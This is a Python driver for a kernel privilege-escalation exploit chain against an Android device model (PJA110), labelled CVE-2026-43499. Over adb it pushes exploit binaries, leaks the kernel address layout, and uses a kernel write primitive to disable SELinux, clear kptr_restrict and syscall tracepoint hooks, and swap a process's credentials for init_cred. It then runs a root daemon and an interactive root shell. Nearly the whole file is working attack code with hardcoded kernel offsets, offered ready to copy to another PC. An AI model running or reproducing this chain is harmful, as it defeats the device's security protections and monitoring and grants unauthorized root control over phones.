#!/usr/bin/env python3
"""PJA110 CVE-2026-43499 adb root helper.

Copy this file (and the binaries it finds next to it / in emu/) to another PC.
Requires: python3 + adb.

Usage:
  python pja110_adbroot.py              # first run: exploit + start rootd
  python pja110_adbroot.py status
  python pja110_adbroot.py id
  python pja110_adbroot.py -c "dmesg | tail"
  python pja110_adbroot.py shell
  python pja110_adbroot.py --serial SERIAL ...
"""
from __future__ import annotations

import argparse
import json
import os
import re
import shutil
import socket
import subprocess
import sys
import time
from pathlib import Path

SERIAL_DEFAULT = os.environ.get("ANDROID_SERIAL", "b107a9ca")
PORT = 27391
FP_NEEDLE = "PJA110"
FP_DISPLAY = "PJA110_16.0.5.702"
NOKASLR_TEXT = 0xFFFFFFC008000000
NOKASLR_FAIR = 0xFFFFFFC00A610AB8
OFF = {
    "fair": 0x2610AB8,
    "selinux_state": 0x33F9990,
    "kptr_slot": 0x313DCA0,
    "user_reserve_slot": 0x31621D8,
    "user_reserve_data": 0x313B5E0,
    "init_cred": 0x323F3E8,
    "init_task": 0x3286400,
    "tp_enter": 0x3323300,
    "tp_exit": 0x3323348,
}
TASK_MM = 0x520
TASK_REAL_CRED = 0x790
TASK_CRED = 0x798
TASK_COMM = 0x7A8
MM_TOTAL_VM = 0xD0
MM_OWNER = 0x348
TP_FUNCS = 0x40
MASK = 0xFFFFFFFFFFFFFFFF
KPTR_ADDEND = 0xFFFFFFFE00000000
def _here():
    f = Path(__file__).resolve()
    if f.suffix == ".py" and f.parent.suffix != ".pyz":
        return f.parent
    return Path.cwd()

HERE = _here()
STATE_HOST = HERE / "pja110.state.json"
DEV_TMP = "/data/local/tmp"
BINS = {
    "e1c6_ret2dir": ["e1c6_ret2dir", "emu/e1c6_ret2dir"],
    "e1c5_ks_window": ["e1c5_ks_window", "emu/e1c5_ks_window"],
    "pja110_rootd": ["pja110_rootd", "emu/pja110_rootd"],
    "e1c6_slotrd": ["e1c6_slotrd", "emu/e1c6_slotrd"],
    "FuseStall.dex": ["FuseStall.dex", "emu/FuseStall.dex"],
}

G = {"serial": SERIAL_DEFAULT, "state": {}}


def die(msg, code=1):
    print("[!] " + msg, file=sys.stderr)
    sys.exit(code)


def log(msg):
    print("[*] " + msg, flush=True)


def adb(args, timeout=60, check=True, capture=True):
    cmd = ["adb", "-s", G["serial"], *args]
    r = subprocess.run(cmd, timeout=timeout, capture_output=capture, text=True)
    if check and r.returncode != 0:
        err = (r.stderr or r.stdout or "").strip()
        die("adb %s failed (%d): %s" % (" ".join(args[:4]), r.returncode, err[:400]))
    return r


def sh(cmd, timeout=60, check=True):
    r = adb(["shell", cmd], timeout=timeout, check=check)
    return (r.stdout or "").replace("\r\n", "\n")


def sh_ok(cmd, timeout=30):
    return sh(cmd, timeout=timeout, check=False)


PAYLOAD_MARK = b"\n#PJA110PAYLOAD\n"
BINDIR = HERE / ".pja110_bins"

def bundled_zip():
    import zipfile
    f = Path(__file__).resolve()
    cands = [f, f.parent, f.parent.parent, Path(sys.argv[0]).resolve()]
    for c in cands:
        try:
            if c.is_file() and zipfile.is_zipfile(c):
                return zipfile.ZipFile(c)
        except Exception:
            pass
    return None

def extract_bundled():
    z = bundled_zip()
    if not z:
        return
    BINDIR.mkdir(exist_ok=True)
    names = [n for n in z.namelist() if n.startswith("bins/") or n.split("/")[-1] in (
        "e1c6_ret2dir", "e1c5_ks_window", "pja110_rootd", "e1c6_slotrd", "FuseStall.dex")]
    for n in names:
        dest = BINDIR / Path(n).name
        info = z.getinfo(n)
        if dest.is_file() and dest.stat().st_size == info.file_size:
            continue
        dest.write_bytes(z.read(n))

def find_bin(name):
    extract_bundled()
    cands = []
    for rel in BINS[name]:
        cands.append(HERE / rel)
        cands.append(HERE / "out" / Path(rel).name)
        cands.append(HERE / "src" / Path(rel).name)
        cands.append(HERE / "emu" / Path(rel).name)
        cands.append(BINDIR / Path(rel).name)
    for p in cands:
        if p.is_file():
            return p
    die("missing binary %s (build with build.py, or put it in out/ / next to this script)" % name)


def push_bins():
    mapping = {
        "e1c6_ret2dir": "e1c6_ret2dir",
        "e1c5_ks_window": "e1c5_ks_window",
        "pja110_rootd": "pja110_rootd",
        "e1c6_slotrd": "E1C6RD",
        "FuseStall.dex": "FuseStall.dex",
    }
    for name, dest in mapping.items():
        src = find_bin(name)
        adb(["push", str(src), DEV_TMP + "/" + dest], timeout=120)
    sh("chmod 755 %s/e1c6_ret2dir %s/e1c5_ks_window %s/pja110_rootd %s/E1C6RD" % (DEV_TMP, DEV_TMP, DEV_TMP, DEV_TMP))


def load_state():
    st = {}
    if STATE_HOST.exists():
        try:
            st = json.loads(STATE_HOST.read_text(encoding="utf-8"))
        except Exception:
            st = {}
    G["state"] = st
    return st


def save_state():
    STATE_HOST.write_text(json.dumps(G["state"], indent=2), encoding="utf-8")
    body = "\n".join("%s=%s" % (k, v) for k, v in G["state"].items()) + "\n"
    tmp = HERE / "_pja110_state.tmp"
    tmp.write_text(body, encoding="utf-8")
    adb(["push", str(tmp), DEV_TMP + "/pja110.state"], check=False)
    try:
        tmp.unlink()
    except Exception:
        pass


def boot_id():
    return sh("cat /proc/sys/kernel/random/boot_id").strip()


def get_fp():
    return sh("getprop ro.build.fingerprint").strip()


def get_display():
    return sh("getprop ro.build.display.id").strip()


def check_device():
    r = adb(["get-state"], check=False)
    if "device" not in (r.stdout or ""):
        die("no device. plug USB, enable debugging, adb devices")
    fp = get_fp()
    disp = get_display()
    if FP_NEEDLE not in fp and FP_DISPLAY not in disp:
        die("fingerprint not PJA110 this OTA:\n  %s\n  %s\nOffsets are baked for %s" % (fp, disp, FP_DISPLAY))
    if FP_DISPLAY not in disp:
        print("[?] display.id=%s (expected %s) — continuing, offsets may be wrong" % (disp, FP_DISPLAY))
    log("device ok  fp=%s" % disp)


def k(sym):
    text = int(G["state"]["text"], 16)
    return text + OFF[sym]


def forward():
    adb(["forward", "tcp:%d" % PORT, "tcp:%d" % PORT], check=False)


END_MARK = b"__PJA110_END__"

def recv_frame(s, timeout=30):
    s.settimeout(timeout)
    chunks = []
    while True:
        try:
            b = s.recv(4096)
        except socket.timeout:
            break
        if not b:
            break
        chunks.append(b)
        if END_MARK in b"".join(chunks):
            break
    data = b"".join(chunks)
    if END_MARK not in data:
        raise RuntimeError("rootd no end marker:\n" + data.decode("utf-8", "replace")[-400:])
    body, _, tail = data.partition(END_MARK)
    rc = int(tail.strip().split()[0])
    return rc, body.decode("utf-8", "replace")


def rootd_cmd(cmd, timeout=30, fatal=True):
    forward()
    try:
        s = socket.create_connection(("127.0.0.1", PORT), timeout=3)
    except OSError as e:
        if fatal:
            die("rootd connect failed: %s" % e)
        raise
    try:
        s.sendall((cmd.replace("\r", "") + "\n").encode())
        rc, body = recv_frame(s, timeout=timeout)
        return rc, body
    except Exception as e:
        if fatal:
            die("rootd cmd failed: %s" % e)
        raise
    finally:
        try:
            s.close()
        except Exception:
            pass


def rootd_up():
    try:
        rc, body = rootd_cmd("__ping__", timeout=3, fatal=False)
        return rc == 0 and "PONG" in body
    except Exception:
        return False


def pid_named(names):
    txt = sh("ps -A")
    want = set(names)
    for line in txt.splitlines()[1:]:
        parts = line.split()
        if len(parts) < 2:
            continue
        name = parts[-1]
        if name in want:
            return parts[1]
    return None


def daemonize(cmd, logfile):
    full = "%s >%s 2>&1" % (cmd, logfile)
    kw = dict(stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
    if os.name == "nt":
        kw["creationflags"] = subprocess.CREATE_NEW_PROCESS_GROUP | getattr(subprocess, "DETACHED_PROCESS", 0x00000008)
    else:
        kw["start_new_session"] = True
    proc = subprocess.Popen(["adb", "-s", G["serial"], "shell", full], **kw)
    G.setdefault("procs", []).append(proc)
    time.sleep(0.4)


def ensure_slotrd():
    pid = pid_named(["E1C6RD", "e1c6_slotrd"])
    if pid:
        log("slotrd already pid %s" % pid)
        return pid
    daemonize("%s/E1C6RD" % DEV_TMP, "%s/e1c6_slotrd.log" % DEV_TMP)
    pid = pid_named(["E1C6RD", "e1c6_slotrd"])
    if not pid:
        die("failed to start E1C6RD; log=" + sh_ok("cat %s/e1c6_slotrd.log 2>/dev/null" % DEV_TMP)[:300])
    log("slotrd pid %s" % pid)
    return pid


def slot_read():
    ensure_slotrd()
    sh("rm -f %s/e1c6_slot.txt %s/readnow; touch %s/readnow" % (DEV_TMP, DEV_TMP, DEV_TMP))
    for _ in range(40):
        time.sleep(0.25)
        txt = sh_ok("cat %s/e1c6_slot.txt 2>/dev/null" % DEV_TMP)
        if txt.count("\n") >= 5 and "pid=" in txt:
            nums = []
            for line in txt.splitlines():
                line = line.strip()
                if line.isdigit():
                    nums.append(int(line))
            if len(nums) >= 8:
                return nums[-1]
    die("slot read timeout")


def wait_r2d_listen(timeout=15):
    t0 = time.time()
    while time.time() - t0 < timeout:
        logline = sh_ok("cat %s/e1c6_ret2dir.log 2>/dev/null" % DEV_TMP)
        if "listening abstract e1c3fuse" in logline:
            return True
        time.sleep(0.15)
    return False


def writethru(dest=None, addend=0, kdata=None, tag="wt"):
    """One 8-byte atomic_add. dest=None + kdata=0 => recapture pageM+0x200."""
    lines = ["addend=0x%X" % (addend & MASK), "kdata=%d" % (0 if kdata == 0 else 1)]
    if dest is not None:
        lines.insert(0, "dest=0x%X" % (dest & MASK))
        lines.append("kdata=1")
    elif kdata == 0:
        lines = ["kdata=0", "addend=0x%X" % (addend & MASK)]
    conf = "\n".join(lines) + "\n"
    p = HERE / "_r2d.conf"
    p.write_text(conf, encoding="utf-8")
    adb(["push", str(p), DEV_TMP + "/r2d.conf"])
    sh("rm -f %s/fusestall.release %s/fusestall.arm %s/fusestall.quit %s/e1c6_ret2dir.log %s/fusestall.log %s/fusestall.out %s/e1c6_ret2dir_watch.log" % ((DEV_TMP,) * 7))
    daemonize("%s/e1c6_ret2dir" % DEV_TMP, "%s/e1c6_ret2dir.log" % DEV_TMP)
    if not wait_r2d_listen():
        die("ret2dir did not listen, log:\n" + sh_ok("tail -40 %s/e1c6_ret2dir.log" % DEV_TMP))
    daemonize("CLASSPATH=%s/FuseStall.dex /system/bin/app_process %s FuseStall" % (DEV_TMP, DEV_TMP), "%s/fusestall.out" % DEV_TMP)
    t0 = time.time()
    logtxt = ""
    while time.time() - t0 < 40:
        time.sleep(0.4)
        logtxt = sh_ok("cat %s/e1c6_ret2dir.log 2>/dev/null" % DEV_TMP)
        if "\n[r2d] done" in logtxt or logtxt.rstrip().endswith("[r2d] done"):
            break
    sh("echo 1 > %s/fusestall.quit" % DEV_TMP, check=False)
    if "[r2d] done" not in logtxt:
        die("%s writethru timeout:\n%s" % (tag, logtxt[-800:]))
    if "Oops" in logtxt or "Fatal" in logtxt:
        die("%s looks crashed:\n%s" % (tag, logtxt[-400:]))
    log("%s ok dest=%s addend=0x%X" % (tag, ("0x%X" % dest) if dest is not None else "pageM", addend & MASK))
    if dest is not None and G["state"].get("slot") and dest == int(G["state"]["slot"], 16):
        cur = int(G["state"].get("slot_ptr", "0"), 16)
        G["state"]["slot_ptr"] = "0x%X" % ((cur + addend) & MASK)
        save_state()
    return logtxt


def recapture():
    log("recapture (new boot, no live fair)")
    txt = writethru(dest=None, addend=0x12340000, kdata=0, tag="recapture")
    m = re.search(r"CLASS CHANGE sclass=(0x[0-9a-fA-F]+)", txt)
    if not m:
        m = re.search(r"peak .* sclass=(0x[0-9a-fA-F]+)", txt)
    if not m:
        sclass_txt = sh_ok("cat %s/e1c6_sclass.txt 2>/dev/null" % DEV_TMP)
        m = re.search(r"sclass=(0x[0-9a-fA-F]+)", sclass_txt)
    if not m:
        die("no CLASS CHANGE / sclass in recapture log")
    sclass = int(m.group(1), 16)
    if (sclass & 0xFFF) != 0xAB8:
        die("sclass=0x%X low12 != 0xab8, not fair_sched_class" % sclass)
    text = sclass - OFF["fair"]
    if (text & 0xFFFFF) != 0:
        die("text=0x%X not 1MB aligned" % text)
    G["state"].update({
        "boot_id": boot_id(),
        "sclass": "0x%X" % sclass,
        "text": "0x%X" % text,
        "slide": "0x%X" % (text - NOKASLR_TEXT),
        "slot": "0x%X" % (text + OFF["user_reserve_slot"]),
        "slot_ptr": "0x%X" % (text + OFF["user_reserve_data"]),
        "unhooked": 0,
    })
    save_state()
    log("slide=%s text=%s fair=%s" % (G["state"]["slide"], G["state"]["text"], hex(sclass)))


def slot_point(addr, tag="slot"):
    slot = int(G["state"]["slot"], 16)
    cur = int(G["state"]["slot_ptr"], 16)
    addend = (addr - cur) & MASK
    if addend == 0:
        return
    writethru(dest=slot, addend=addend, tag=tag)
    G["state"]["slot_ptr"] = "0x%X" % (addr & MASK)
    save_state()


def slot_restore():
    slot_point(int(G["state"]["text"], 16) + OFF["user_reserve_data"], tag="slot-restore")
    v = slot_read()
    if v != 131072:
        print("[?] user_reserve=%s expected 131072" % v)
    else:
        log("slot restored 131072")


def make_permissive():
    if "Permissive" in sh_ok("getenforce"):
        log("already Permissive")
        return
    writethru(dest=k("selinux_state"), addend=MASK, tag="selinux-1")
    ge = sh_ok("getenforce").strip()
    if "Permissive" not in ge:
        die("setenforce via write failed, getenforce=%s" % ge)
    log("SELinux Permissive")


def make_kptr0():
    cur = sh_ok("cat /proc/sys/kernel/kptr_restrict").strip()
    if cur.startswith("0"):
        log("kptr already 0")
        return
    writethru(dest=k("kptr_slot"), addend=KPTR_ADDEND, tag="kptr0")
    cur = sh_ok("cat /proc/sys/kernel/kptr_restrict").strip()
    log("kptr_restrict=%s" % cur)


def unhook():
    if int(G["state"].get("unhooked") or 0):
        log("tracepoint funcs already zeroed (state)")
        return
    enter = k("tp_enter") + TP_FUNCS
    exitp = k("tp_exit") + TP_FUNCS
    slot_point(enter, tag="slot-tp-enter")
    funcs_e = slot_read()
    log("sys_enter.funcs=0x%X" % funcs_e)
    if funcs_e:
        writethru(dest=enter, addend=(-funcs_e) & MASK, tag="zero-enter-funcs")
    slot_point(exitp, tag="slot-tp-exit")
    funcs_x = slot_read()
    log("sys_exit.funcs=0x%X" % funcs_x)
    if funcs_x:
        writethru(dest=exitp, addend=(-funcs_x) & MASK, tag="zero-exit-funcs")
    slot_restore()
    G["state"]["unhooked"] = 1
    save_state()
    log("unhooked sys_enter/exit")


def start_holder():
    log("starting KernelSnitch leak holder")
    sh("rm -f %s/pja110_go %s/pja110_hold.pid %s/e1c5_ks.log" % (DEV_TMP, DEV_TMP, DEV_TMP))
    daemonize("%s/e1c5_ks_window leak" % DEV_TMP, "%s/e1c5_ks.log" % DEV_TMP)
    mm = None
    pid = None
    t0 = time.time()
    while time.time() - t0 < 180:
        time.sleep(1)
        txt = sh_ok("cat %s/e1c5_ks.log 2>/dev/null" % DEV_TMP)
        m = re.search(r"LEAK_DONE mm=(0x[0-9a-fA-F]+)", txt)
        if m:
            mm = int(m.group(1), 16)
        m2 = re.search(r"holding pid=(\d+)", txt)
        if m2:
            pid = int(m2.group(1))
        if mm and pid and "wait pja110_go" in txt:
            break
        if "ks setup failed" in txt or "collision finding failed" in txt:
            die("KernelSnitch leak failed:\n" + txt[-500:])
    if not mm or not pid:
        die("KS leak timeout:\n" + sh_ok("tail -50 %s/e1c5_ks.log" % DEV_TMP))
    log("holder pid=%d mm=0x%X" % (pid, mm))
    G["state"]["hold_pid"] = pid
    G["state"]["hold_mm"] = "0x%X" % mm
    save_state()
    return pid, mm


def plant(pid, mm):
    slot_point(mm + MM_TOTAL_VM, tag="slot-total_vm")
    tv = slot_read()
    statm = sh("cat /proc/%d/statm" % pid).split()[0]
    log("total_vm=%s statm=%s" % (tv, statm))
    if str(tv) != statm:
        die("mm mismatch tv=%s statm=%s — abort plant" % (tv, statm))
    slot_point(mm + MM_OWNER, tag="slot-owner")
    task = slot_read()
    if (task & 0xFF) != 0:
        die("task=0x%X not aligned" % task)
    log("task=0x%X" % task)
    slot_point(task + TASK_CRED, tag="slot-cred")
    cred = slot_read()
    log("old cred=0x%X" % cred)
    slot_restore()
    initc = k("init_cred")
    writethru(dest=initc, addend=2, tag="init_cred.usage+2")
    add = (initc - cred) & MASK
    writethru(dest=task + TASK_REAL_CRED, addend=add, tag="plant-real_cred")
    writethru(dest=task + TASK_CRED, addend=add, tag="plant-cred")
    st = sh("cat /proc/%d/status" % pid)
    if "Uid:\t0\t0\t0\t0" not in st and "Uid:\t0    0    0    0" not in st:
        # android uses tabs or spaces
        m = re.search(r"Uid:\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)", st)
        if not m or m.group(1) != "0":
            die("plant did not stick:\n" + "\n".join(st.splitlines()[:12]))
    log("plant ok, pid %d is uid 0" % pid)
    G["state"]["hold_task"] = "0x%X" % task
    save_state()


def kick_rootd():
    sh("rm -f %s/pja110_rootd.ok %s/pja110_rootd.err; touch %s/pja110_go" % (DEV_TMP, DEV_TMP, DEV_TMP))
    t0 = time.time()
    while time.time() - t0 < 20:
        time.sleep(0.5)
        ok = sh_ok("cat %s/pja110_rootd.ok 2>/dev/null" % DEV_TMP)
        if "uid=0" in ok:
            log("rootd " + ok.strip())
            return
        if rootd_up():
            rc, body = rootd_cmd("__id__")
            log("rootd up:\n" + body)
            return
    die("rootd did not start:\n" + sh_ok("cat %s/pja110_rootd.ok %s/pja110_rootd.err %s/e1c5_ks.log 2>/dev/null | tail -30" % (DEV_TMP, DEV_TMP, DEV_TMP)))


def exploit():
    push_bins()
    bid = boot_id()
    st = G["state"]
    if st.get("boot_id") != bid or "text" not in st:
        recapture()
    else:
        log("reuse slide %s for this boot" % st.get("slide"))
    make_permissive()
    make_kptr0()
    ensure_slotrd()
    unhook()
    pid, mm = start_holder()
    plant(pid, mm)
    kick_rootd()
    if not rootd_up():
        die("rootd not reachable after plant")
    rc, body = rootd_cmd("__id__")
    print(body.rstrip())
    print()
    print("rootd up. next:")
    print("  python pja110_adbroot.py id")
    print("  python pja110_adbroot.py -c \"cat /proc/1/environ\"")
    print("  python pja110_adbroot.py shell")


def ensure_root():
    check_device()
    load_state()
    if rootd_up():
        return True
    ok = sh_ok("cat %s/pja110_rootd.ok 2>/dev/null" % DEV_TMP)
    if "uid=0" in ok:
        forward()
        time.sleep(0.2)
        if rootd_up():
            return True
    log("rootd down, running exploit chain")
    exploit()
    return True


def cmd_status():
    check_device()
    load_state()
    print("boot_id", boot_id())
    print("fingerprint", get_display())
    print("adb", sh("id").strip())
    print("getenforce", sh_ok("getenforce").strip())
    print("kptr", sh_ok("cat /proc/sys/kernel/kptr_restrict").strip())
    print("state", json.dumps(G["state"], indent=2))
    print("rootd", "UP" if rootd_up() else "DOWN")
    if rootd_up():
        rc, body = rootd_cmd("__id__")
        print(body.rstrip())


def cmd_run(cmdline):
    ensure_root()
    rc, body = rootd_cmd(cmdline, timeout=120)
    sys.stdout.write(body)
    if not body.endswith("\n"):
        sys.stdout.write("\n")
    sys.exit(rc)


def host_clear():
    if os.name == "nt":
        os.system("cls")
    else:
        sys.stdout.write("\033[2J\033[H")
        sys.stdout.flush()


def _enable_vt():
    if os.name != "nt":
        return
    try:
        import ctypes
        k32 = ctypes.windll.kernel32
        h = k32.GetStdHandle(-11)
        mode = ctypes.c_uint()
        if k32.GetConsoleMode(h, ctypes.byref(mode)):
            k32.SetConsoleMode(h, mode.value | 0x0004)
    except Exception:
        pass


def _last_token(line):
    i = len(line)
    while i > 0 and line[i - 1] not in " \t":
        i -= 1
    return line[:i], line[i:]


def _common_prefix(items):
    if not items:
        return ""
    s = items[0]
    for x in items[1:]:
        n = min(len(s), len(x))
        i = 0
        while i < n and s[i] == x[i]:
            i += 1
        s = s[:i]
        if not s:
            break
    return s


def _print_matches(matches):
    sys.stdout.write("\n")
    if not matches:
        return
    width = shutil.get_terminal_size((80, 24)).columns
    mw = max(len(m) for m in matches) + 2
    cols = max(1, width // mw)
    rows = (len(matches) + cols - 1) // cols
    for r in range(rows):
        parts = []
        for c in range(cols):
            idx = c * rows + r
            if idx < len(matches):
                parts.append(matches[idx].ljust(mw))
        sys.stdout.write("".join(parts).rstrip() + "\n")


def _read_key_windows():
    import msvcrt
    ch = msvcrt.getwch()
    if ch in ("\x00", "\xe0"):
        ch2 = msvcrt.getwch()
        return {
            "H": "up",
            "P": "down",
            "K": "left",
            "M": "right",
            "G": "home",
            "O": "end",
            "S": "del",
        }.get(ch2, "ignore")
    if ch == "\r":
        return "enter"
    if ch == "\n":
        return "enter"
    if ch == "\t":
        return "tab"
    if ch == "\x08":
        return "backspace"
    if ch == "\x7f":
        return "backspace"
    if ch == "\x03":
        return "ctrlc"
    if ch in ("\x04", "\x1a"):
        return "eof"
    if ch == "\x1b":
        return "esc"
    return ch


def _read_key_unix():
    ch = sys.stdin.read(1)
    if not ch:
        return "eof"
    if ch == "\n" or ch == "\r":
        return "enter"
    if ch == "\t":
        return "tab"
    if ch in ("\x7f", "\x08"):
        return "backspace"
    if ch == "\x03":
        return "ctrlc"
    if ch == "\x04":
        return "eof"
    if ch != "\x1b":
        return ch
    rest = sys.stdin.read(1)
    if rest != "[":
        return "esc"
    rest += sys.stdin.read(1)
    return {
        "[A": "up",
        "[B": "down",
        "[C": "right",
        "[D": "left",
        "[H": "home",
        "[F": "end",
        "[3": "del",
    }.get(rest, "ignore")


class _RawStdin:
    def __enter__(self):
        self.old = None
        if os.name == "nt":
            return self
        import termios
        import tty
        self.fd = sys.stdin.fileno()
        self.old = termios.tcgetattr(self.fd)
        tty.setraw(self.fd)
        return self

    def __exit__(self, *a):
        if self.old is not None:
            import termios
            termios.tcsetattr(self.fd, termios.TCSADRAIN, self.old)


def _redraw(prompt, buf, cur):
    sys.stdout.write("\r\033[2K" + prompt + buf)
    extra = len(buf) - cur
    if extra > 0:
        sys.stdout.write("\033[%dD" % extra)
    sys.stdout.flush()


def _ask_comp(s, line):
    s.sendall(("__comp__ " + line + "\n").encode())
    rc, body = recv_frame(s, timeout=8)
    seen = set()
    out = []
    for m in body.splitlines():
        m = m.strip("\r")
        if not m or m in seen:
            continue
        seen.add(m)
        out.append(m)
    out.sort()
    return out


def _edit_line(prompt, s, history):
    buf = ""
    cur = 0
    hist_i = len(history)
    draft = ""
    _redraw(prompt, buf, cur)
    read_key = _read_key_windows if os.name == "nt" else _read_key_unix
    while True:
        key = read_key()
        if key == "enter":
            sys.stdout.write("\n")
            sys.stdout.flush()
            return buf
        if key == "eof":
            if not buf:
                sys.stdout.write("\n")
                sys.stdout.flush()
                return None
            continue
        if key == "ctrlc":
            sys.stdout.write("^C\n")
            sys.stdout.flush()
            return ""
        if key == "ignore" or key == "esc":
            continue
        if key == "left":
            if cur > 0:
                cur -= 1
            _redraw(prompt, buf, cur)
            continue
        if key == "right":
            if cur < len(buf):
                cur += 1
            _redraw(prompt, buf, cur)
            continue
        if key == "home":
            cur = 0
            _redraw(prompt, buf, cur)
            continue
        if key == "end":
            cur = len(buf)
            _redraw(prompt, buf, cur)
            continue
        if key == "up":
            if history and hist_i > 0:
                if hist_i == len(history):
                    draft = buf
                hist_i -= 1
                buf = history[hist_i]
                cur = len(buf)
            _redraw(prompt, buf, cur)
            continue
        if key == "down":
            if hist_i < len(history):
                hist_i += 1
                buf = draft if hist_i == len(history) else history[hist_i]
                cur = len(buf)
            _redraw(prompt, buf, cur)
            continue
        if key == "backspace":
            if cur > 0:
                buf = buf[: cur - 1] + buf[cur:]
                cur -= 1
            _redraw(prompt, buf, cur)
            continue
        if key == "del":
            if cur < len(buf):
                buf = buf[:cur] + buf[cur + 1:]
            _redraw(prompt, buf, cur)
            continue
        if key == "tab":
            try:
                matches = _ask_comp(s, buf)
            except Exception:
                sys.stdout.write("\a")
                sys.stdout.flush()
                continue
            prefix, tok = _last_token(buf)
            if not matches:
                sys.stdout.write("\a")
                sys.stdout.flush()
                continue
            if len(matches) == 1:
                m = matches[0]
                if not m.endswith("/"):
                    m += " "
                buf = prefix + m
                cur = len(buf)
                _redraw(prompt, buf, cur)
                continue
            cp = _common_prefix(matches)
            if cp and cp != tok and cp.startswith(tok):
                buf = prefix + cp
                cur = len(buf)
                _redraw(prompt, buf, cur)
                continue
            _print_matches(matches)
            _redraw(prompt, buf, cur)
            continue
        if isinstance(key, str) and len(key) == 1 and key >= " ":
            buf = buf[:cur] + key + buf[cur:]
            cur += 1
            _redraw(prompt, buf, cur)


def _device_hostname():
    for cmd in ("getprop net.hostname", "getprop ro.product.device"):
        h = (sh_ok(cmd) or "").strip()
        if not h:
            continue
        h = h.splitlines()[-1].strip()
        if h and "not found" not in h.lower():
            return h[:64]
    return "android"


def _prompt_str(host, cwd):
    return "root@%s:%s# " % (host, cwd or "/")


def _update_cwd(line, rc, body, cwd):
    if rc != 0:
        return cwd
    raw = (line or "").strip()
    if not raw:
        return cwd
    head = raw.split(None, 1)[0]
    if head not in ("cd", "pwd"):
        return cwd
    for ln in reversed((body or "").splitlines()):
        ln = ln.strip()
        if ln.startswith("/"):
            return ln
    return cwd


def _print_repl_body(line, rc, body):
    raw = (line or "").strip()
    head = raw.split(None, 1)[0] if raw else ""
    if head == "cd" and rc == 0:
        return False
    if body:
        sys.stdout.write(body)
        if not body.endswith("\n"):
            sys.stdout.write("\n")
        return True
    return False


def cmd_shell():
    ensure_root()
    print("[*] interactive rootd repl  (exit/quit leaves daemon up, Tab completes)")
    forward()
    host = _device_hostname()
    cwd = "/"
    s = socket.create_connection(("127.0.0.1", PORT), timeout=5)
    s.sendall(b"__repl__\n")
    try:
        s.sendall(b"pwd\n")
        rc, body = recv_frame(s, timeout=8)
        cwd = _update_cwd("pwd", rc, body, cwd)
    except Exception:
        pass
    history = []
    tty = False
    try:
        tty = sys.stdin.isatty() and sys.stdout.isatty()
    except Exception:
        tty = False
    try:
        if not tty:
            while True:
                try:
                    sys.stdout.write(_prompt_str(host, cwd))
                    sys.stdout.flush()
                    line = sys.stdin.readline()
                except EOFError:
                    line = ""
                if not line:
                    try:
                        s.sendall(b"exit\n")
                        recv_frame(s, timeout=5)
                    except Exception:
                        pass
                    break
                line = line.replace("\r", "").rstrip("\n")
                if line in ("clear", "cls"):
                    host_clear()
                    continue
                s.sendall((line + "\n").encode())
                try:
                    rc, body = recv_frame(s, timeout=120)
                except Exception as e:
                    print("[!] rootd frame: %s" % e)
                    break
                cwd = _update_cwd(line, rc, body, cwd)
                if not _print_repl_body(line, rc, body):
                    if not tty:
                        sys.stdout.write("\n")
                if line in ("exit", "quit", "logout"):
                    break
            return
        _enable_vt()
        with _RawStdin():
            while True:
                line = _edit_line(_prompt_str(host, cwd), s, history)
                if line is None:
                    try:
                        s.sendall(b"exit\n")
                        recv_frame(s, timeout=5)
                    except Exception:
                        pass
                    break
                line = line.replace("\r", "").rstrip("\n")
                if line in ("clear", "cls"):
                    host_clear()
                    continue
                if line:
                    history.append(line)
                    if len(history) > 200:
                        del history[:50]
                s.sendall((line + "\n").encode())
                try:
                    rc, body = recv_frame(s, timeout=120)
                except Exception as e:
                    sys.stdout.write("[!] rootd frame: %s\n" % e)
                    break
                cwd = _update_cwd(line, rc, body, cwd)
                if not _print_repl_body(line, rc, body):
                    if not tty:
                        sys.stdout.write("\n")
                if line in ("exit", "quit", "logout"):
                    break
    except KeyboardInterrupt:
        print()
    finally:
        try:
            s.close()
        except Exception:
            pass


def main():
    ap = argparse.ArgumentParser(description="PJA110 adb root (CVE-2026-43499)")
    ap.add_argument("--serial", "-s", default=SERIAL_DEFAULT)
    ap.add_argument("-c", dest="command", default=None, help="run a root shell command")
    ap.add_argument("cmd", nargs="*", help="status | shell | root command words")
    args = ap.parse_args()
    G["serial"] = args.serial
    if args.command:
        cmd_run(args.command)
        return
    rest = args.cmd
    if not rest:
        ensure_root()
        rc, body = rootd_cmd("__id__")
        print(body.rstrip())
        print()
        print("ok. copy pja110_adbroot.pyz to another PC (needs python3 + adb).")
        print("  python pja110_adbroot.pyz")
        print("  python pja110_adbroot.pyz id")
        print("  python pja110_adbroot.pyz -c \"ls -l /proc/1\"")
        print("  python pja110_adbroot.pyz shell")
        print("reboot drops rootd; run the pyz once more after reboot.")
        return
    if rest[0] == "status":
        cmd_status()
        return
    if rest[0] == "shell":
        cmd_shell()
        return
    cmd_run(" ".join(rest))


if __name__ == "__main__":
    main()
